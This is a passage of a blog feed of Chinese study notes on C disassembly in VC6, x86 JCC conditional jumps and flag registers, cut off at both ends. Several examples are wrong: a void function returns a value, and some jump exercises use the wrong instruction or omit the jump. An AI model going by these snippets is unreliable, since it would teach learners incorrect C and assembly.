id="逆成c代码"><a href="#逆成c代码" class="headerlink" title="逆成c代码"></a>逆成c代码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">#include &quot;stdafx.h&quot;</span><br><span class="line">int __stdcall plus2(int a,int b,int c)</span><br><span class="line">&#123;</span><br><span class="line">return a+b+c;</span><br><span class="line">&#125;</span><br><span class="line">int __cdecl plus3(int a,int b)</span><br><span class="line">&#123;</span><br><span class="line">return a+b;</span><br><span class="line">&#125;</span><br><span class="line">int __fastcall plus(int a,int b,int c,int d,int e)</span><br><span class="line">&#123;</span><br><span class="line">int z,s;</span><br><span class="line">z=plus2(a,b,c);</span><br><span class="line">s=plus3(b,a);</span><br><span class="line">return plus3(z,s);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">int main(int argc, char* argv[])</span><br><span class="line">&#123;</span><br><span class="line">int x;</span><br><span class="line">x=plus(1,3,4,6,7);</span><br><span class="line">printf(&quot;%d\n&quot;,x);</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个练习过程其实是十分艰难的，我分析了有一个小时左右，主要是</p><ul><li>开始对局部变量有些生疏，函数内部定义一个变量后汇编中会如何显示、</li><li>fastcall的认识不是很好</li><li>传入的<code>6 7</code>做了什么也不是很清楚<br>最后结合ida生成的伪代码才完成，不过经过这个练习都学到了很多，使用ida也感受到了ida的强大，学到了在其中如何看一些简单的函数以及其与真正汇编代码的区别。</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;C语言与反汇编学习（二）&quot;&gt;&lt;a href=&quot;#C语言与反汇编学习（二）&quot; class=&quot;headerlink&quot; title=&quot;C语言与反汇编学习（二）&quot;&gt;&lt;/a&gt;C语言与反汇编学习（二）&lt;/h1&gt;&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>C语言与反汇编学习（一）</title>
    <link href="https://chumen77.github.io/2019/10/19/C%E8%AF%AD%E8%A8%80%E4%B8%8E%E5%8F%8D%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <id>https://chumen77.github.io/2019/10/19/C语言与反汇编学习（一）/</id>
    <published>2019-10-19T02:26:17.000Z</published>
    <updated>2019-10-19T03:45:18.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="C语言与反汇编学习（一）"><a href="#C语言与反汇编学习（一）" class="headerlink" title="C语言与反汇编学习（一）"></a>C语言与反汇编学习（一）</h1><h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>本课主要学习VC开发环境的简单使用，和几个函数反汇编分析。</p><h2 id="简单下熟悉VC6开发环境"><a href="#简单下熟悉VC6开发环境" class="headerlink" title="简单下熟悉VC6开发环境"></a>简单下熟悉VC6开发环境</h2><p>这里我直接用了编程达人的vc虚拟机，官方的vc6.0不是很好用，每次只支持调试一次，人家的可以突破这个限制。</p><h3 id="创建项目"><a href="#创建项目" class="headerlink" title="创建项目"></a>创建项目</h3><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/10/19/C语言与反汇编学习（一）/images/15714523427592.jpg" alt="-w911" title>                </div>                <div class="image-caption">-w911</div>            </figure><h3 id="执行过程"><a href="#执行过程" class="headerlink" title="执行过程"></a>执行过程</h3><p>代码编写–&gt;生成EXE(F7)–&gt;运行(F5)–&gt;结束运行(Shift+F5)</p><h3 id="一些简单操作"><a href="#一些简单操作" class="headerlink" title="一些简单操作"></a>一些简单操作</h3><h4 id="设置断点"><a href="#设置断点" class="headerlink" title="设置断点"></a>设置断点</h4><p><strong>设置断点</strong>是光标放到哪行代码后按下<code>F9</code>即可，这也是后面很多操作的最重要的起初操作。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/10/19/C语言与反汇编学习（一）/images/15714525807811.jpg" alt="-w338" title>                </div>                <div class="image-caption">-w338</div>            </figure><h4 id="调出寄存器，栈，内存窗口"><a href="#调出寄存器，栈，内存窗口" class="headerlink" title="调出寄存器，栈，内存窗口"></a>调出寄存器，栈，内存窗口</h4><p><strong>调出寄存器，栈，内存窗口</strong><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/10/19/C语言与反汇编学习（一）/images/15714528282225.jpg" alt="-w586" title>                </div>                <div class="image-caption">-w586</div>            </figure><br>看图，在空白处右击点击一下你需要的窗口就好了。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/10/19/C语言与反汇编学习（一）/images/15714528997602.jpg" alt="-w526" title>                </div>                <div class="image-caption">-w526</div>            </figure><h4 id="进入反汇编窗口"><a href="#进入反汇编窗口" class="headerlink" title="进入反汇编窗口"></a>进入反汇编窗口</h4><p>在程序运行时，且有适当断点的时候，看图</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/10/19/C语言与反汇编学习（一）/images/15714530279259.jpg" alt="-w517" title>                </div>                <div class="image-caption">-w517</div>            </figure><p>右击程序框内的空白处，然后点击GO to Disassembly 就好了。在这里面最重要的操作就是：<code>F10 F11</code>分别是步过和步入。这个跟od里不一样。</p><h2 id="C语言的调用"><a href="#C语言的调用" class="headerlink" title="C语言的调用"></a>C语言的调用</h2><p>1、无参数，无返回值的函数调用<br>2、有参数，无返回值的函数调用<br>3、无参数，有返回值的函数调用<br>4、有参数，有返回值的函数调用</p><h2 id="函数的反汇编分析-空函数"><a href="#函数的反汇编分析-空函数" class="headerlink" title="函数的反汇编分析-空函数"></a>函数的反汇编分析-空函数</h2><h3 id="先上c："><a href="#先上c：" class="headerlink" title="先上c："></a>先上c：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#include &quot;stdafx.h&quot;</span><br><span class="line">void Function()</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line">int main(int argc, char* argv[])</span><br><span class="line">&#123;</span><br><span class="line">Function()</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="反汇编分析："><a href="#反汇编分析：" class="headerlink" title="反汇编分析："></a>反汇编分析：</h3><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/10/19/C语言与反汇编学习（一）/images/15714535234194.jpg" alt="-w438" title>                </div>                <div class="image-caption">-w438</div>            </figure><h2 id="函数的反汇编分析-简单功能"><a href="#函数的反汇编分析-简单功能" class="headerlink" title="函数的反汇编分析-简单功能"></a>函数的反汇编分析-简单功能</h2><h3 id="两个数相加："><a href="#两个数相加：" class="headerlink" title="两个数相加："></a>两个数相加：</h3><h4 id="c代码："><a href="#c代码：" class="headerlink" title="c代码："></a>c代码：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#include &quot;stdafx.h&quot;</span><br><span class="line">void Plus(int x,int y)</span><br><span class="line">&#123;</span><br><span class="line">    return x+y;</span><br><span class="line">&#125;</span><br><span class="line">int main(int argc, char* argv[])</span><br><span class="line">&#123;</span><br><span class="line">Plus(2,1);</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="反汇编分析：-1"><a href="#反汇编分析：-1" class="headerlink" title="反汇编分析："></a>反汇编分析：</h4><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/10/19/C语言与反汇编学习（一）/images/15714537632825.jpg" alt="-w709" title>                </div>                <div class="image-caption">-w709</div>            </figure><h3 id="三个数相加："><a href="#三个数相加：" class="headerlink" title="三个数相加："></a>三个数相加：</h3><h4 id="c代码：-1"><a href="#c代码：-1" class="headerlink" title="c代码："></a>c代码：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#include &quot;stdafx.h&quot;</span><br><span class="line">void Plus(int x,int y，int z)</span><br><span class="line">&#123;</span><br><span class="line">    return x+y;</span><br><span class="line">&#125;</span><br><span class="line">int main(int argc, char* argv[])</span><br><span class="line">&#123;</span><br><span class="line">Plus(2,1,3);</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="反汇编分析：-2"><a href="#反汇编分析：-2" class="headerlink" title="反汇编分析："></a>反汇编分析：</h4><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/10/19/C语言与反汇编学习（一）/images/15714539277702.jpg" alt="-w974" title>                </div>                <div class="image-caption">-w974</div>            </figure><p>（和上面那个基本一样，只是为了练习，不详细写了）</p><h2 id="函数的反汇编分析-嵌套调用"><a href="#函数的反汇编分析-嵌套调用" class="headerlink" title="函数的反汇编分析-嵌套调用"></a>函数的反汇编分析-嵌套调用</h2><p>要求：编写一个函数，能够实现对任意5个整数实现加法(使用Plus1和Plus2).</p><h3 id="c代码"><a href="#c代码" class="headerlink" title="c代码"></a>c代码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#include &quot;stdafx.h&quot;</span><br><span class="line"></span><br><span class="line">int Plus1(int x,int y)</span><br><span class="line">&#123;</span><br><span class="line">return x+y;</span><br><span class="line">&#125;</span><br><span class="line">int Plus2(int x,int y,int z)</span><br><span class="line">&#123;</span><br><span class="line">return x+y+z;</span><br><span class="line">&#125;</span><br><span class="line">int Plus3(int a,int b,int c,int d,int e)</span><br><span class="line">&#123;</span><br><span class="line">int i,j,m;</span><br><span class="line">i=Plus1(a,b);</span><br><span class="line">j=Plus2(c,d,e);</span><br><span class="line">m=Plus1(i,j);</span><br><span class="line">return m;</span><br><span class="line">&#125;</span><br><span class="line">int main(int argc, char* argv[])&#123;Plus3(2,1,3,1,5);return 0;&#125;</span><br></pre></td></tr></table></figure><h3 id="反汇编分析：-3"><a href="#反汇编分析：-3" class="headerlink" title="反汇编分析："></a>反汇编分析：</h3><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/10/19/C语言与反汇编学习（一）/images/15714541318519.jpg" alt="-w1534" title>                </div>                <div class="image-caption">-w1534</div>            </figure><p>（中间调用一个Plus1 和 Plus2，就不必进入分析了，基本跟前面简单分析那两个一样，这个练习是顺成下来的。）</p><h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>学完汇编了，就接着C与汇编结合分析，步步把常见的结合分析完。这次学习与练习，可以一整段一整段的读汇编代码了，<strong>（这个前面其实还有画过堆栈图，当时是一句句分析学习的，为了熟悉堆栈和汇编语句，找时间补下笔记</strong>）也熟悉了函数是如何嵌套调用的。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;C语言与反汇编学习（一）&quot;&gt;&lt;a href=&quot;#C语言与反汇编学习（一）&quot; class=&quot;headerlink&quot; title=&quot;C语言与反汇编学习（一）&quot;&gt;&lt;/a&gt;C语言与反汇编学习（一）&lt;/h1&gt;&lt;h2 id=&quot;前言：&quot;&gt;&lt;a href=&quot;#前言：&quot; class
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>JCC学习</title>
    <link href="https://chumen77.github.io/2019/10/07/JCC/"/>
    <id>https://chumen77.github.io/2019/10/07/JCC/</id>
    <published>2019-10-07T15:09:50.000Z</published>
    <updated>2019-10-19T15:48:32.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="JCC学习"><a href="#JCC学习" class="headerlink" title="JCC学习"></a>JCC学习</h1><h2 id="JCC指令集合"><a href="#JCC指令集合" class="headerlink" title="JCC指令集合"></a>JCC指令集合</h2><h3 id="详细"><a href="#详细" class="headerlink" title="详细__"></a>详细__</h3><p>1、JE, JZ　　　　　　结果为零则跳转(相等时跳转)　　　　 　　 ZF=1</p><p>2、JNE, JNZ　　  　　结果不为零则跳转(不相等时跳转) 　　　　   ZF=0</p><p>3、JS　　　　　　　  结果为负则跳转　　　　　　　　　　　　    SF=1</p><p>4、JNS 　　　　　　  结果为非负则跳转　　　　　　　　　　　   SF=0</p><p>5、JP, JPE　　　　　 结果中1的个数为偶数则跳转　　　　　　      PF=1</p><p>6、JNP, JPO　　　　  结果中1的个数为偶数则跳转　　　　　　      PF=0</p><p>7、JO　　　　　　　  结果溢出了则跳转　　　　　　　　　　      OF=1</p><p>8、JNO 　　　　　　  结果没有溢出则跳转　　　　　　　　            OF=0</p><p>9、JB, JNAE 　　　　 小于则跳转 (无符号数)　　　　　　　　　   CF=1</p><p>10、JNB, JAE 　　　  大于等于则跳转 (无符号数)　　　　　　　   CF=0</p><p>11、JBE, JNA  　　　 小于等于则跳转 (无符号数)　　　　　　　  CF=1 or ZF=1</p><p>12、JNBE, JA 　　　  大于则跳转(无符号数)　　　　　　　　　  CF=0 and ZF=0</p><p>13、JL, JNGE 　　　  小于则跳转 (<strong>有符号数</strong>)　　　　　　　　    SF≠ OF</p><p>14、JNL, JGE　　　   大于等于则跳转 (<strong>有符号数</strong>)　　　　　　    SF=OF</p><p>15、JLE, JNG  　　　 小于等于则跳转 (<strong>有符号数</strong>)　　　　　　    ZF=1 or SF≠ OF</p><p>16、JNLE, JG 　　　  大于则跳转(<strong>有符号数</strong>)　　　　　　　　     ZF=0 and SF=OF</p><h3 id="表格总结"><a href="#表格总结" class="headerlink" title="表格总结"></a>表格总结</h3><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/10/07/JCC/images/15713086707312.jpg" alt="-w1067" title>                </div>                <div class="image-caption">-w1067</div>            </figure><p>直接摘抄的做的很详细，正好有助记，但是需要和上面详细指令搭配使用，要<strong>注意那些有符号的JCC跳转指令，</strong>因为在这个表里没有体现。也不用太着急背，熟悉一下就可以了，有部分是可以直接记住的，在往后遇到模糊的直接查下就可以了。</p><h3 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h3><p><strong>JCC指令决定它跳不跳转跟别的没关系，只跟EFLAG标志寄存器有关系，根据符号位来进行跳转的</strong></p><h2 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h2><h3 id="使用汇编指令修改标志寄存器中的某个位的值，实现JCC的十六种跳转"><a href="#使用汇编指令修改标志寄存器中的某个位的值，实现JCC的十六种跳转" class="headerlink" title="使用汇编指令修改标志寄存器中的某个位的值，实现JCC的十六种跳转."></a>使用汇编指令修改标志寄存器中的某个位的值，实现JCC的十六种跳转.</h3><p>前提：能用CMP和TEST实现的优先考虑.</p><h4 id="1、JE-JZ-结果为零则跳转-相等时跳转-ZF-1"><a href="#1、JE-JZ-结果为零则跳转-相等时跳转-ZF-1" class="headerlink" title="1、JE, JZ 结果为零则跳转(相等时跳转) ZF=1"></a>1、JE, JZ 结果为零则跳转(相等时跳转) ZF=1</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">MOV AL,1</span><br><span class="line">MOV CL,1</span><br><span class="line">CMP AL,CL</span><br><span class="line">JE 0X0040102B</span><br></pre></td></tr></table></figure><h4 id="2、JNE-JNZ-结果不为零则跳转-不相等时跳转-ZF-0"><a href="#2、JNE-JNZ-结果不为零则跳转-不相等时跳转-ZF-0" class="headerlink" title="2、JNE, JNZ 结果不为零则跳转(不相等时跳转) ZF=0"></a>2、JNE, JNZ 结果不为零则跳转(不相等时跳转) ZF=0</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">MOV AL,1</span><br><span class="line">TEST AL,AL</span><br><span class="line">JNZ 0X00401006</span><br></pre></td></tr></table></figure><p>####3、 JS 结果为负则跳转 SF=1</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">MOV AL,1</span><br><span class="line">MOV CL,2</span><br><span class="line">CMP AL,CL</span><br></pre></td></tr></table></figure><h4 id="4、-JNS-结果为非负则跳转-SF-0"><a href="#4、-JNS-结果为非负则跳转-SF-0" class="headerlink" title="4、 JNS 结果为非负则跳转 SF=0"></a>4、 JNS 结果为非负则跳转 SF=0</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">XOR EAX,EAX</span><br><span class="line">JNS 0X0040102F</span><br></pre></td></tr></table></figure><h4 id="5、-JP-JPE-结果中1的个数为偶数则跳转-PF-1"><a href="#5、-JP-JPE-结果中1的个数为偶数则跳转-PF-1" class="headerlink" title="5、 JP, JPE 结果中1的个数为偶数则跳转 PF=1"></a>5、 JP, JPE 结果中1的个数为偶数则跳转 PF=1</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">MOV AL,2</span><br><span class="line">MOV CL,2</span><br><span class="line">CMP AL,CL</span><br><span class="line">JPE 0X00401008</span><br></pre></td></tr></table></figure><h4 id="6、JNP-JPO-结果中1的个数为奇数则跳转-PF-0"><a href="#6、JNP-JPO-结果中1的个数为奇数则跳转-PF-0" class="headerlink" title="6、JNP, JPO 结果中1的个数为奇数则跳转 PF=0"></a>6、JNP, JPO 结果中1的个数为奇数则跳转 PF=0</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">MOV AL,2</span><br><span class="line">MOV CL,1</span><br><span class="line">CMP AL,CL</span><br><span class="line">JPE 0X00401008</span><br></pre></td></tr></table></figure><h4 id="7、-JO-结果溢出了则跳转-OF-1"><a href="#7、-JO-结果溢出了则跳转-OF-1" class="headerlink" title="7、 JO 结果溢出了则跳转 OF=1"></a>7、 JO 结果溢出了则跳转 OF=1</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">MOV AL,80</span><br><span class="line">SUB AL,10</span><br><span class="line">JO 0X00401008</span><br></pre></td></tr></table></figure><h4 id="8、-JNO-结果没有溢出则跳转-OF-0"><a href="#8、-JNO-结果没有溢出则跳转-OF-0" class="headerlink" title="8、 JNO 结果没有溢出则跳转 OF=0"></a>8、 JNO 结果没有溢出则跳转 OF=0</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">MOV AX,0FFFF</span><br><span class="line">ADD AX,80</span><br><span class="line">JNO 0X00401010</span><br></pre></td></tr></table></figure><h4 id="9、-JB-JNAE-小于则跳转-无符号数-CF-1"><a href="#9、-JB-JNAE-小于则跳转-无符号数-CF-1" class="headerlink" title="9、 JB, JNAE 小于则跳转 (无符号数) CF=1"></a>9、 JB, JNAE 小于则跳转 (无符号数) CF=1</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">MOV AX,80</span><br><span class="line">MOV CX,90</span><br><span class="line">CMP AX,CX</span><br><span class="line">JB 0X0040103E</span><br></pre></td></tr></table></figure><h4 id="10、-JNB-JAE-大于等于则跳转-无符号数-CF-0"><a href="#10、-JNB-JAE-大于等于则跳转-无符号数-CF-0" class="headerlink" title="10、 JNB, JAE 大于等于则跳转 (无符号数) CF=0"></a>10、 JNB, JAE 大于等于则跳转 (无符号数) CF=0</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">MOV AX,80</span><br><span class="line">MOV CX,90</span><br><span class="line">CMP CX,AX</span><br><span class="line">JB 0X00401044</span><br></pre></td></tr></table></figure><h4 id="11、-JBE-JNA-小于等于则跳转-无符号数-CF-1-or-ZF-1"><a href="#11、-JBE-JNA-小于等于则跳转-无符号数-CF-1-or-ZF-1" class="headerlink" title="11、 JBE, JNA 小于等于则跳转 (无符号数) CF=1 or ZF=1"></a>11、 JBE, JNA 小于等于则跳转 (无符号数) CF=1 or ZF=1</h4><p>一种直接跟练习9一样直接构造让CF=1或者让跟练习1让ZF=0就可以了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">MOV AL,1</span><br><span class="line">MOV CL,1</span><br><span class="line">CMP AL,CL</span><br><span class="line">JE 0X0040102B</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">MOV AX,80</span><br><span class="line">MOV CX,90</span><br><span class="line">CMP AX,CX</span><br><span class="line">JB 0X0040103E</span><br></pre></td></tr></table></figure><h4 id="12、-JNBE-JA-大于则跳转-无符号数-CF-0-and-ZF-0"><a href="#12、-JNBE-JA-大于则跳转-无符号数-CF-0-and-ZF-0" class="headerlink" title="12、 JNBE, JA 大于则跳转(无符号数) CF=0 and ZF=0"></a>12、 JNBE, JA 大于则跳转(无符号数) CF=0 and ZF=0</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">MOV AX,80</span><br><span class="line">MOV CX,90</span><br><span class="line">CMP CX,AX</span><br><span class="line">JB 0X00401044</span><br></pre></td></tr></table></figure><p>解析：</p><p>这个与练习10的区别就是不可以让两个数相等。</p><h4 id="13、-JL-JNGE-小于则跳转-有符号数-SF≠-OF"><a href="#13、-JL-JNGE-小于则跳转-有符号数-SF≠-OF" class="headerlink" title="13、 JL, JNGE 小于则跳转 (有符号数) SF≠ OF"></a>13、 JL, JNGE 小于则跳转 (有符号数) SF≠ OF</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">MOV AL,0XFF</span><br><span class="line">MOV CL,0X01</span><br><span class="line">CMP AL,CL</span><br><span class="line">JB 0X00401063</span><br><span class="line">JL 0X00401063</span><br></pre></td></tr></table></figure><p>解析：终于到了让我十分迷惑的有无符号JCC的跳转指令，这里做了对比JB JL,看标志位肯定能解决一切（这是对计算机来说），我们没看标志位提前做判断的诀窍：<strong>就是当你用有符号数JCC指令（JG,JL,JLE,JGE，JNG，JNL,JNGE，JNLE）的时候，一定要把两个操作数直接人工看做有符号来看！</strong></p><p><strong>比如这个练习用到了JL,FF就是-1了，那么<code>-1&lt;1</code>这个肯定的，所以JL跳转。但是对于JB，FF就是FF肯定大于1，所以没有跳转。</strong></p><h4 id="14、-JNL-JGE-大于等于则跳转-有符号数-SF-OF"><a href="#14、-JNL-JGE-大于等于则跳转-有符号数-SF-OF" class="headerlink" title="14、 JNL, JGE 大于等于则跳转 (有符号数) SF=OF"></a>14、 JNL, JGE 大于等于则跳转 (有符号数) SF=OF</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">MOV AL,1</span><br><span class="line">MOV CL,0CC</span><br><span class="line">CMP AL,CL</span><br><span class="line">JGE 0X0040108B</span><br></pre></td></tr></table></figure><h4 id="15、-JLE-JNG-小于等于则跳转-有符号数-ZF-1-or-SF≠-OF"><a href="#15、-JLE-JNG-小于等于则跳转-有符号数-ZF-1-or-SF≠-OF" class="headerlink" title="15、 JLE, JNG 小于等于则跳转 (有符号数) ZF=1 or SF≠ OF"></a>15、 JLE, JNG 小于等于则跳转 (有符号数) ZF=1 or SF≠ OF</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">MOV AL,1</span><br><span class="line">MOV CL,0CC</span><br><span class="line">CMP CL,AL</span><br><span class="line">JGE 0X0040108B</span><br></pre></td></tr></table></figure><p>这个就是对立15练习，想利用ZF等于1这个跳转，在cmp中没什么好整的，<strong>这两个操作数只能是相同的数，没什么看不看做有无符号的说法</strong>。</p><h4 id="16、-JNLE-JG-大于则跳转-有符号数-ZF-0-and-SF-OF"><a href="#16、-JNLE-JG-大于则跳转-有符号数-ZF-0-and-SF-OF" class="headerlink" title="16、 JNLE, JG 大于则跳转(有符号数) ZF=0 and SF=OF"></a>16、 JNLE, JG 大于则跳转(有符号数) ZF=0 and SF=OF</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">MOV AX,1</span><br><span class="line">MOV CX,FF</span><br><span class="line">CMP AX,CX</span><br><span class="line">JG  0x004010A6</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">MOV AL,1</span><br><span class="line">MOV CL,0FF</span><br><span class="line">CMP AL,CL</span><br><span class="line">JG  0x004010A6</span><br></pre></td></tr></table></figure><p>解析：</p><p>判断一下，第1段代码对还是第2段代码对？</p><p>在原来的观点，对有符号JCC要把两个操作数看做转化后的有符号数对待，<strong>且一定要注意下数据宽度。</strong>在这个例子中，第一段代码是无法实现JG跳转的，<strong>因为其数据宽度的问题，影响到SF,所以其没办法<code>SF=OF</code>就没法跳转。</strong></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;JCC学习&quot;&gt;&lt;a href=&quot;#JCC学习&quot; class=&quot;headerlink&quot; title=&quot;JCC学习&quot;&gt;&lt;/a&gt;JCC学习&lt;/h1&gt;&lt;h2 id=&quot;JCC指令集合&quot;&gt;&lt;a href=&quot;#JCC指令集合&quot; class=&quot;headerlink&quot; title=
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>标志寄存器</title>
    <link href="https://chumen77.github.io/2019/10/06/%E6%A0%87%E5%BF%97%E5%AF%84%E5%AD%98%E5%99%A8/"/>
    <id>https://chumen77.github.io/2019/10/06/标志寄存器/</id>
    <published>2019-10-06T14:01:14.000Z</published>
    <updated>2019-10-17T15:47:57.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="标志寄存器"><a href="#标志寄存器" class="headerlink" title="标志寄存器"></a>标志寄存器</h1><h2 id="部分标志寄存器详细介绍"><a href="#部分标志寄存器详细介绍" class="headerlink" title="部分标志寄存器详细介绍"></a>部分标志寄存器详细介绍</h2><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/10/06/标志寄存器/images/15704423980063.jpg" alt title>                </div>                <div class="image-caption"></div>            </figure><p>需要先熟练记住这几个寄存器的位置和名称：<code>CF PF AF ZF SF OF</code></p><h3 id="CF"><a href="#CF" class="headerlink" title="CF"></a>CF</h3><p>进位标志CF(Carry Flag):如果运算结果的<strong>最高位</strong>产生了一个进位或借位，那么，其值为1，否则其值为0。</p><p>解析：在看运算结果的时候，先提前确定好参与运算的数是<strong>有无符号数</strong>和<strong>它们的数据宽度</strong>。其与PF的难辨难分，重点是看参与运算的数是否为无符号数，这个是程序员写代码的时候定义的。默认都是有符号的，这就主要看后面的PF了。</p><h3 id="PF"><a href="#PF" class="headerlink" title="PF"></a>PF</h3><p>奇偶标志PF(Parity 